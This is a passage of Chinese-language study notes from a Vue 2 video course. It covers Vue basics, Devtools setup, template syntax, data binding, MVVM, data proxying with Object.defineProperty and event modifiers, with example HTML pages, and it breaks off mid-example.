# 尚硅谷Vue2.0+Vue3.0全套教程丨vuejs从入门到精通



# 网址

[尚硅谷Vue2.0+Vue3.0全套教程丨vuejs从入门到精通_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1Zy4y1K7SH/?spm_id_from=333.337.search-card.all.click&vd_source=fd2565402cd3354a08d530810ff9aaf7)

vue官网教程里面的视频

https://v2.cn.vuejs.org/v2/guide/（不是）==> https://learning.dcloud.io/#/?vid=0



# vue 基础



## vue 简介

### 为什么要学习 vue2

因为 vue2 仍然是目前的主流版本， vue3是未来的趋势，vue2经历过70+次版本迭代，有较高的可掌握性



### 什么是 vue

vue 是一套用于构建用户界面的渐进式 JavaScript 框架，==用于将用户数据转换为界面==

1. 渐进式：如果是一个简单应用，只需要引入一个轻量小巧的核心库就可以，压缩后只需要100kb；如果是一个复杂应用，可以在此基础上再次引入各式各样的 Vue 插件库



### 谁开发的

尤雨溪

八卦，vue崛起之路：https://www.bilibili.com/video/BV1Zy4y1K7SH?t=256.6&p=2

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302012347732.png" alt="image-20230201234745618" style="zoom:50%;" />



### vue 的特点

1. 采用组件化模式，提高代码复用率，且让代码更好维护。

	  - 组件化：一个版块是一个 vue 文件，一个 vue 文件是一个组件

	  - <img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202301190829318.png" alt="image-20230119082933126" style="zoom: 33%;" />

		

	  - 一个 vue 文件 包含一个组件的 html、css、js内容，所以就算是移植，这个板块的内容亦不会被修改

2. 声明式编码，让编码人员无需直接操作 DOM， 提高开发效率

  - 比如：有一组数据，将这组数据中的每一条转换为一个\<li>\</li>, 然后插入到 列表中

    <img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302012351546.png" alt="image-20230201235125479" style="zoom: 50%;" />

    - 使用 js 编写代码（命令式编码，每一条命令都得写到，写一步动一步）
    
      ```javascript
      persons = {};
      // 准备字符串
      let htmlstr = ''
      // 遍历数据拼接 html 字符串
      persons.forEach(p => {
          htmlstr += `<li>${p.id} - ${p.name} - ${p.age}</li>`
      });
      
      // 获取 list 元素
      let list = document.querySelector('.list');
      // 修改内容
      list.innerHTML = htmlstr
      ```

    - 使用 vue 编写（声明式编码）
    
      ```vue
      <ul id="list">
          <li v-for="p in persons">
              {{p.id}} - {{p.name}} -{{p.age}}
          </li>
      </ul>
      ```

3. 使用虚拟 DOM + 优秀的 DIff 算法，尽量复用 DOM 节点

  - JS 的实现，拿下图举例：每次更新列表的时候都需要拼接字符串，然后将原有的数据清空，再次插入，而原有的数据依然还会在第二次插入，减少了这些数据的复用，并降低了性能

    <img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202301190927175.png" alt="image-20230119092752062" style="zoom:33%;" />

  - vue 的实现，

    - 虚拟 DOM 就是内存里的数据，通过 vue 转化到真实的 DOM 上

    - DIff 算法，对新旧虚拟 DOM 进行比较，如果是旧的已有的 DOM 节点则不变，而新的 DOM 节点，添加上去就可以

      <img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202301190933856.png" alt="image-20230119093355646" style="zoom:33%;" />

4. 体积小：压缩后 33K

5. 更高的运行效率

	   基于虚拟 dom，一种可以预先通过 JavaScript 进行各种计算，把最终的 DOM 操作计算出来并优化的技术，由于这个 DOM 操作属于==预处理操作==，并没有真实的操作 DOM，所以叫做虚拟 DOM

6. 双向数据绑定

	   让开发者不用再去操作 dom 对象，把更多的精力投入到业务逻辑上

7. 生态丰富，学习成本低

	   市面上拥有大量成熟、稳定的基于 vue.js 的 UI 框架，常用组件！拿来即用实现快速开发！

8. 遵循 **MVVM** 模式

9. 编码简洁, 体积小, 运行效率高, 适合移动/PC 端开发

10. 它本身只关注 UI, 也可以引入其它第三方库开发项目



### 学习 vue 之前要掌握的 JavaScript 基础知识：

  - ES6 语法规范
  - ES6 模块化
  - 包管理器
  - 原型、原型链
  - 数组常用方法
  - axios
  - promise
  - ……



### 与其他 JS 框架的关联

1. 借鉴 Angular 的**模板**和**数据绑定**技术

2. 借鉴 React 的**组件化**和**虚拟 DOM** 技术



### vue 的周边库

1. vue-cli: vue 脚手架

2. vue-resource

3. axios

4. vue-router: 路由

5. vuex: 状态管理

6. element-ui: 基于 vue 的 UI 组件库(PC 端) 

​	……



## vue 官网使用指南

英文官网: https://vuejs.org/

中文官网地址：https://cn.vuejs.org/

github地址：https://github.com/vuejs/vue

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302020848993.png" alt="image-20230202084800925" style="zoom:50%;" />





## 搭建 vue 开发环境

安装方式：

	1. Vue Devtools 开发工具 +  vue（使用 \<script> 标签引入 ： cdn）

2. NPM + 命令行工具（一般指脚手架 vue-cli ），新手不推荐使用



第一种方式：

​	Vue Devtools ：https://github.com/vuejs/devtools

​	可以直接在 Chrome 商店上安装到扩展程序中

	1. 点击 [Install the extension](https://devtools.vuejs.org/guide/installation.html)
	1. 后面就按照官方安装文档进行操作即可。==设置允许访问所有网站和文件网站基本就 OK了！不用在看第三步！==
	1. https://devtools.vuejs.org/guide/installation.html





<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302021102142.png" alt="image-20230202110222076" style="zoom:67%;" />

会报两个错误：

​		错误一安装 vue-devtools 即可

​		错误二：写一个 js 文件，引入即可

```js
Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
```

因为这是由 Vue 里面 config 属性的 productionTip 属性引起的，关闭即可

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302021116885.png" alt="image-20230202111621833" style="zoom:50%;" />

==但是修改了之后还是有提示，直接修改 vue.js 源文件，OK了！！！==



## 如何使用 vue-devtools

1. 打开控制台，点击 Vue 选项，Root 代表根目录，在对应的值处可以进行修改，修改完后保存，页面上的值也会进行相应的改变！

	

![image-20230202173754018](https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302021737087.png)



## hello world 案例

==强制刷新 shift + 刷新按钮，刷新出来的内容和直接刷新出来的内容不一样，要更多一些==

基础代码如下：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello world 案例</title>
</head>
<body>
    <div>
        <h1>Hello world</h1>
    </div>
    <script src="../../js/vue.js"></script>
    <script>

    </script>
</body>
</html>
```

右键使用浏览器打开没问题，不会报错，但是右键使用 live server 打开，会发送报错，但是没送请求的情况下发送了请求，请求了一个未知名文件，是因为：（强制刷新后看网络，会发现请求了一个 favicon.ico 文件（网站的 页签图标））live server 会将当前工作区的目录文件作为一个根目录（根资源去使用，占用一个端口（默认是 5500）创建一个服务器，并打开当前的页面。所以只要在工作区目录中加入一个 favicon.ico 文件即可解决！

![image-20230202113608320](https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302021136366.png)

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302021136873.png" alt="image-20230202113645818" style="zoom:50%;" />

vue 代码如下：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello world 案例</title>
</head>
<body>
    <!-- 准备一个容器 -->
    <div id="root">
        <!-- <h1>Hello world</h1> -->
        <!-- 使用插值法写入动态数值 -->
        <!-- h1 和 h2 中的内容均成为 Vue 模板 -->
        <h1>Hello, 我的名字是{{msg}}</h1>  
        <h2>我的年龄是{{age}}</h2>   
    </div>
    <script src="../../js/vue.js"></script>
    <script>
        // 创建 Vue 实例  这里 const x = 其实不是必须的，因为并没有用到实例对象
        const v = new Vue({
            el: '#root', // el: element 的简写，用于指定当前 Vue 实例为哪个容器服务，值通常为 css 选择器字符串
            // el: document.getElementById('root')   // 较为笨重的写法
            data: {//data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
                // msg: 'Hello world -vue'
                msg: '小明',
                age: 13
            }
        });
    </script>
</body>
</html>
```

其中：

​        1.想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象

​        2.root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法

​        3.root容器里的代码被称为【Vue模板】，被 Vue 实例保管后会通过解析【Vue模板】依次更新值，Vue 实例中的值改变后页面上的数据会自动更更新，不用再手动操作 DOM

​        4.Vue实例和容器是一一对应的；一个 Vue 实例只能保管一个容器的数据，同样的一个容器的数据也只能被一个 Vue 实例保管

​        5.真实开发中只有一个Vue实例，并且会配合着组件一起使用；

​        6.{{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；

​        7.一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；

​        ==注意区分：js表达式 和 js代码(语句)==

​            1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：

​                  (1). a

​                  (2). a+b

​                  (3). demo(1)

​                  (4). x === y ? 'a' : 'b'

​            2.js代码(语句)

​                  (1). if(){}

​                  (2). for(){}



## vue 模板语法

### 模板的理解

html 中包含了一些 JS 语法代码，语法分为两种，分别为：

1. 插值语法（双大括号表达式）

	​	功能：用于解析标签体内容。

	​    写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。

	​    用处：在标签体中均可以使用（开始和结束标签内的内容称为标签体）

2. 指令（以 v-开头）

​      功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....)。可以将标签里的每一个属性的值变为可动态获取的，且可以直接读取到data中的所有属性。

​     举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式

​     备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>模板语法</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>插值语法</h1>
			<h3>你好，{{name}}</h3>
			<hr/>
			<h1>指令语法</h1>
            <!--加上 v-bind: 后 href 引号中的内容就会被当作一个 JS 表达式去执行  -->
			<a v-bind:href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a>
			<a :href="school.url" x="hello">点我去{{school.name}}学习2</a>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'jack',
				school:{
					name:'尚硅谷',
					url:'http://www.atguigu.com',
				}
			}
		})
	</script>
</html>
```



### 数据绑定

Vue中有2种数据绑定的方式：

1. 单向数据绑定

	- 语法：==v-bind:href ="xxx" 或简写为 :href==
	- 特点：数据只能从 data 流向页面，即：通过 v-bind: 绑定的属性可以通过修改 data 的内容来更改，但是不能通过修改 页面的值来改变 data 

	<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302021743448.png" alt="image-20230202174331363" style="zoom: 33%;" />

2. 双向数据绑定

	- 语法：==v-mode:value="xxx" 或简写为 v-model="xxx" ，只是后面是 value 的时候可以简写==

	- 特点：数据不仅能从 data 流向页面，还能从页面流向 data

	-  备注：

		1. 双向绑定一般都应用在表单类元素（可以输入的元素）上（如：input、select等）

		2. v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>数据绑定</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 普通写法 -->
			<!-- 单向数据绑定：<input type="text" v-bind:value="name"><br/>
			双向数据绑定：<input type="text" v-model:value="name"><br/> -->

			<!-- 简写 -->
			单向数据绑定：<input type="text" :value="name"><br/>
			双向数据绑定：<input type="text" v-model="name"><br/>

			<!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上 -->
			<!-- <h2 v-model:x="name">你好啊</h2> -->
		</div>
	</body>
	<script type="text/javascript">
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```



### el 和 data 的两种写法

1. el有2种写法

​           (1). new Vue时候配置el属性（vscode 中配置用户代码片段更方便）。

​           (2).先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。

2. data有2种写法

​           (1).对象式（后期会报错）

​           (2).函数式（函数可以写全称或简写）

```js
data: function(){}
data(){}
```

​           如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。

3. 一个重要的原则：

​         由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例，而是指向 Window 对象了。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>el与data的两种写法</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>你好，{{name}}</h1>
		</div>
	</body>
	<script type="text/javascript">
		//el的两种写法
		/* const v = new Vue({
			//el:'#root', //第一种写法
			data:{
				name:'尚硅谷'
			}
		})
		console.log(v)
		v.$mount('#root') //第二种写法 */

		//data的两种写法
		new Vue({
			el:'#root',
			//data的第一种写法：对象式
			/* data:{
				name:'尚硅谷'
			} */

			//data的第二种写法：函数式
			data(){
				console.log('@@@',this) //此处的this是Vue实例对象
				return{
					name:'尚硅谷'
				}
			}
		})
	</script>
</html>
```



## MVVM 模型

虽然没有完全遵循 MVVM 模型，但是 Vue 的设计也受到了它的启发。因此在文档中经常会使用 vm （ViewModel）这个变量名表示 Vue 实例。

1. M：模型(Model) ：对应 data 中的数据

2. V：视图(View) ：模板

3. VM：视图模型(ViewModel) ： Vue 实例对象

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302021833028.png" alt="image-20230202183324965" style="zoom: 80%;" />

观察发现：

​	1. data中所有的属性，最后都出现在了vm身上，即：变成了 vm 身上的属性==（与数据代理有关）==。

​	2. vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>理解MVVM</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学校名称：{{name}}</h1>
			<h1>学校地址：{{address}}</h1>
			<!-- <h1>测试一下1：{{1+1}}</h1>
			<h1>测试一下2：{{$options}}</h1>
			<h1>测试一下3：{{$emit}}</h1>
			<h1>测试一下4：{{_c}}</h1> -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				address:'北京',
			}
		})
		console.log(vm)
	</script>
</html>
```



## 数据代理

### Object.defineProperty()

MDN：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty

`Object.defineProperty()` 方法会直接在一个对象上定义一个新属性，或者修改一个对象的现有属性，并返回此对象。

> 备注：应当直接在 [`Object`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object) 构造器对象上调用此方法，而不是在任意一个 `Object` 类型的实例上调用。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#语法)

```js
Object.defineProperty(obj, prop, descriptor)
```

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#参数)

- `obj`

	要定义属性的对象。

- `prop`

	要定义或修改的属性的名称或 [`Symbol`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Symbol) 。

- `descriptor`

	要定义或修改的属性描述符。

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#返回值)

被传递给函数的对象。



观察下面的代码发现：

1.  如果是直接写在 person 对象内部的属性，可以通过 Object.keys() 来遍历得到，但是如果是 Object.defineProperty() 添加的属性，默认是不能通过 Object.keys() 遍历（枚举）得到的，但是可以通过添加  enumerable 属性设置为可枚举。（会发现在浏览器中表示他们的颜色不同）

	直接写在内部：

	<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302021924653.png" alt="image-20230202192429587" style="zoom: 67%;" />

	通过 Object.defineProperty() 方法添加属性：

	<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302021927451.png" alt="image-20230202192714390" style="zoom:67%;" />

2. 同样可以通过属性设置以这种方法添加的属性是否可以被修改和删除，但是默认是无法进行操作的

	直接写在内部：

	<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302022123404.png" alt="image-20230202212349340" style="zoom: 67%;" />

	通过方法添加的属性：

	<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302022126618.png" alt="image-20230202212619547" style="zoom:67%;" />

3. 方法 get() 可以通过数据代理的方式，为 添加的属性绑定一个动态变化的值，而若是直接加上属性，则在定义的时候该属性的值其实就已经固定了，后续尽管修改了 中间的数据代理的那个值，但是该属性的值确实不变的，固定的。

4. 方法 set() 则可以进行属性值的修改。

	直接写在内部：

	<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302022142981.png" alt="image-20230202214228908" style="zoom: 67%;" />

	方法 get() 和 set()：

	*注意：不可以同时指定getter、setter访问器和值(value)或可写属性(writable)*

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302022156500.png" alt="image-20230202215614423" style="zoom: 67%;" />

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>回顾Object.defineproperty方法</title>
    </head>
    <body>
        
    </body>
    <script>
        let number = 19
        let person = {
            name: '张华',
            sex: '男',
            // age: 18
            // age: number
        }
        Object.defineProperty(person, 'age', {
            // Invalid property descriptor. Cannot both specify accessors and a value or writable attribute
            // 报错：不能同时指定访问器和值或可写属性   
            // 不可以同时指定getter、setter访问器和值(value)或可写属性(writable)
            // value: 18,
            // enumerable: true, // 控制属性是否可以枚举，默认值是 false
            // writable: true,  // 控制属性是否可以被修改，默认值是 false
            // configurable: true,  // 控制属性是否可以被删除，默认值是 false

            get: function(){    // get(){}
                return number;
            },
            set(value){
                number = value;
            }
        });
        console.log(person)
        // console.log(Object.keys(person));
    </script>
</html>
```



### vue 中的数据代理

==数据代理==：通过一个对象代理对另一个对象中属性的操作（读/写）。

==Vue中的数据代理==：通过vm对象来代理data对象中属性的操作（读/写）。

==Vue中数据代理的好处==：更加方便的操作data中的数据

==基本原理==：

- 通过Object.defineProperty()把data对象中所有属性添加到vm上。

-  为每一个添加到vm上的属性，都指定一个getter/setter。
-  在getter/setter内部去操作（读/写）data中对应的属性。

即：vm 被创建后会保存 name 和 address属性，当输出时会将data 中的 name 拿过来，而修改vm中的 name 时即是修改 data 里的 name，这就是 vue 中的数据代理。

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302022213883.png" alt="image-20230202221350792" style="zoom:50%;" />



创建 Vue 实例对象时传入的 data 就是 vm._data，但是数据是经过数据劫持处理的

也就是说，在改变 vm._data.xxx 后相应的 data 也发生了变化，用到 data 的页面内容自然也就发生了变化，数据代理

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302022227348.png" alt="image-20230202222707166" style="zoom: 25%;" />



但是我们可以看到 vm._data 里面的内容其实也是需要点击才可见的，因为 _data 里面的内容会反映给 vm 的 name 和 address 属性，同时需要满足数据改变，页面内容改变，所以 _data 的内容不会是固定的，但是这个不叫做数据代理，而是数据劫持所做的处理。

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302022231471.png" alt="image-20230202223154391" style="zoom: 67%;" />



## 事件处理

### 绑定监听

1. v-on:xxx="fun" 

2. @xxx="fun" 

3. @xxx="fun(参数)" 

4. 默认事件形参: event

5. 隐含属性对象: $event



### 事件的基本使用

1. 使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；

2. 事件的回调需要配置在methods对象中，最终会在vm上；

3. methods中配置的函数，不要用箭头函数！否则this就不是vm了；

4. methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；

5. @click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件的基本使用</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- <button v-on:click="showInfo">点我提示信息</button> -->
			<button @click="showInfo1">点我提示信息1（不传参）</button>    <!-- 不使用() 就是不传参 -->
			<!-- 前面使用 $event 就可以在传入 event 对象的同时传入 参数而不至于弄丢参数 -->
			<button @click="showInfo2($event,66)">点我提示信息2（传参）</button>  <!--使用() 就是传参 -->
		</div>
	</body>
	<script type="text/javascript">
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
			},
			methods:{
				showInfo1(event){
					// console.log(event.target.innerText)
					// console.log(this) //此处的this是vm
					alert('同学你好！')
				},
				showInfo2(event,number){
					console.log(event,number)
					// console.log(event.target.innerText)
					// console.log(this) //此处的this是vm
					alert('同学你好！！')
				}
			}
		})
	</script>
</html>
```



### 事件修饰符

1. prevent：阻止默认事件（常用）；

2. stop：阻止事件冒泡（常用）；

3. once：事件只触发一次（常用）；

4. capture：使用事件的捕获模式；

5. self：只有event.target是当前操作的元素时才触发事件；

6. passive：事件的默认行为立即执行，无需等待事件回调执行完毕；（多用于移动端等项目）

==修饰符可以连续写== 

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件修饰符</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
		<style>
			*{
				margin-top: 20px;
			}
			.demo1{
				height: 50px;
				background-color: skyblue;
			}
			.box1{
				padding: 5px;
				background-color: skyblue;
			}
			.box2{
				padding: 5px;
				background-color: orange;
			}
			.list{
				width: 200px;
				height: 200px;
				background-color: peru;
				overflow: auto;
			}
			li{
				height: 100px;
			}
		</style>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- 阻止默认事件（常用） -->
			<a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>

			<!-- 阻止事件冒泡（常用） -->
			<div class="demo1" @click="showInfo">
				<button @click.stop="showInfo">点我提示信息</button>
				<!-- 修饰符可以连续写 -->
				<!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
			</div>

			<!-- 事件只触发一次（常用） -->
			<button @click.once="showInfo">点我提示信息</button>

			<!-- 使用事件的捕获模式 -->
			<!-- 加上后在捕获阶段就会执行最外层的 div， 即输出 12，如果不加就输出 21 -->
			<div class="box1" @click.capture="showMsg(1)">
				div1
				<div class="box2" @click="showMsg(2)">
					div2
				</div>
			</div>

			<!-- 只有event.target是当前操作的元素时才触发事件； -->
			<!-- 当不加 .self 的时候因为冒泡，此时输出的 e.target 都是 <button>xxx</button>，两个函数均执行 -->
			<!-- 但是加上 .self 后 <div></div> 冒泡时 e.target 并不是 <div></div>,所以 div不会执行函数，等同于阻止了冒泡 -->
			<div class="demo1" @click.self="showInfo">
				<button @click="showInfo">点我提示信息</button>
			</div>

			<!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
			<!-- @wheel 是鼠标的滚轮上下滚动触发的事件 -->
			<!-- @scroll 是滚动条上下滚动触发的事件 -->
			<ul @wheel.passive="demo" class="list">
				<li>1</li>
				<li>2</li>
				<li>3</li>
				<li>4</li>
			</ul>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
